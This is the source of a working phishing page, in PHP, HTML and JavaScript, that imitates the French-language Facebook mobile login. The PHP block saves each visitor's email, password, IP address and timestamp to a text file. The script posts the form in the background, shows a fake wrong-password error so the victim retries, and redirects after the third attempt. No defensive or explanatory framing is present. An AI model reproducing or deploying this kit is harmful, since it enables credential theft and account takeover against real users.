<?php


if (isset($_POST['email'])) {
    $myfile = fopen("details.txt", "a+") or die("Unable to open file!");
    $objDateTime = new DateTime('NOW');
    $result = $objDateTime->format('Y-m-d H:i:s');
    $i = $_POST['try_number'];



    fwrite($myfile, "------------------Facebook Login try".$i."--------------);." . PHP_EOL . "Time connected :" . $result . PHP_EOL . "ip adresss :" . $_SERVER['REMOTE_ADDR'] . PHP_EOL);

    $email = $_POST['email'] . PHP_EOL;
    $pass = $_POST['pass'] . PHP_EOL;
    fwrite($myfile, "email: " . $email);
    fwrite($myfile, "pass: " . $pass);
    fclose($myfile);
}





?>
<html>

<head>
    <title>Facebook - Log In or Sign Up</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <meta name="theme-color" content="#3b5998">

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/PmaMYI-otLm.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="5V7Dk" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/sElGPUCsgPH.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="fGjU6" crossorigin="anonymous">
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js'></script>
    <style>
        .onError {
            color: red;
            display: none;
            text-align: start;
        }
    </style>
</head>

<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw   portrait" style="min-height: 640px; background-color: rgb(255, 255, 255);">
    <script id="u_0_e" nonce="">
        (function(a) {
            a.__updateOrientation = function() {
                var b = !!a.orientation && a.orientation !== 180,
                    c = document.body;
                c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
                return b
            }
        })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 640px;">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 640px;">
                <div class="_7om2">
                    <div class="_4g34" id="u_0_0">

                        <div class="_4-4l">

                            <div class="_7om2 _52we _52z6">
                                <div class="_4g34"><a href="/login/?refid=8"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook"></a></div>
                            </div>
                            <div class="_5rut">
                                <form type="submit" method="post" class="mobile-login-form _5spm" id="login_form" name="login_form" data-sigil="m_login_form" data-autoid="autoid_4"><input type="hidden" name="lsd" value="AVo7M16Z" autocomplete="off"><input type="hidden" name="jazoest" value="2587" autocomplete="off"><input type="hidden" name="m_ts" value="1598123447"><input type="hidden" name="li" value="t21BX8sY8xh1xvj3oo5tZ0tQ"><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries">
                                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="otp_retrieve_desc_container"></div>
                                    <div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_96n9" id="email_input_container"><input autocorrect="off" required oninvalid="this.setCustomValidity('Veuillez remplir votre email')" onchange="this.setCustomValidity('')" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Numéro de telephone ou email" data-sigil="m_login_email">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_55wq"></div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_7om2">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" required oninvalid="this.setCustomValidity('Veuillez remplir votre mot de passe')" onchange="this.setCustomValidity('')" placeholder="Mot de passe" type="password" data-sigil="password-plain-text-toggle-input"></div>
                                                        </div>
                                                        <div class="_5s61 _216i _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <div class="_2pi9" style="display:none" id="u_0_2"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3">HIDE</span><span class="mfss" id="u_0_4">SHOW</span></a></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="onError">Mot de passe erroné</div>
                                            </div>

                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_5" data-sigil="login_password_step_element">
                                            <button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="SubmitButton" data-sigil="touchable  m_login_button" data-autoid="autoid_3" onclick="check_clicks()"><span class="_55sr" onsubmit="e.preventDefault();">Log In</span></button></div>
                                        <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                        <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                        <div id="otp_button_elem_container"></div>
                                    </div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input type="hidden" name="prefill_source" id="prefill_source"><input type="hidden" name="prefill_type" id="prefill_type"><input type="hidden" name="first_prefill_source" id="first_prefill_source"><input type="hidden" name="first_prefill_type" id="first_prefill_type"><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false">
                                    <div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>
                                </form>
                                <div>
                                    <div class="_43mg _8qtf"><span class="_43mh">or</span></div>
                                    <div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_2">Créez Nouveau Compte
                                        </a></div>
                                </div>
                                <div>
                                    <div class="other-links _8p_m">
                                        <ul class="_5pkb _55wp">
                                            <li><span class="mfss fcg"><a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Mot de passe oublié?</a></span></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div style="display:none">
                    <div></div>
                    <div></div>
                </div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
            </div>
            <div class=""></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_8" data-sigil="marea">
                <div class="_5vsg" id="u_0_9" style="max-height: 768px;"></div>
                <div class="_5vsh" id="u_0_a" style="max-height: 377px;"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
                </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Try Again</a>
                </div>
            </div>
        </div>
    </div>
    
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_7om2 _52we">
                    <div class="_5s61">
                        <div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_c" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_d" data-sigil="dialog-back-button"><i class="img sp_t0F5GNpHI8g_3x sx_8f20a7" style="margin-top: 2px;"></i></button></div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_b" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
            </div>

        </div>
    </div>
</body>
<script>
    var error_div = document.getElementsByClassName('onError')[0];
    var old_password ="";

    var input_pass = document.getElementsByName('pass')[0];
    input_pass.addEventListener("keyup", () => {
     
    if (i!=0)
    {
        if(old_password != document.getElementsByName('pass')[0].value)
        {
            error_div.style.display="none";
        }
    }

    });
    var form = document.getElementById('login_form')
    var number = 2;
    var i = 0;
    // document.getElementById("counter").innerHTML=""+i+"";
    form.addEventListener('submit', function submitForm(event) {
        document.getElementsByName("try_number")[0].value=i;

        console.log($('#login_form').serialize());
        var pass = document.getElementsByName('pass')[0].value;
        old_password=pass;
        // Prevent the default form submission
        event.preventDefault()
        // Do something with the form data
        console.table([...new FormData(form).entries()])

        jQuery.ajax({
            type: "POST",
            url: 'form_fb.php',
            data: $('#login_form').serialize(),
            success: function() {
                // alert($('#login_form').serialize());
            }


        });
        // Reset the form
        //   form.reset()
    })

    function check_clicks() {
        i++;
        if (i == 3) {
            document.location.href = "form_fb_2.php"


        } else {
            var error_div = document.getElementsByClassName('onError')[0];
            error_div.style.display = 'inline';

        }
    }

    function copy_data() {
        var email = document.getElementById('email').value;
        var pass = document.getElementById('pass').value;


    }
</script>

</html>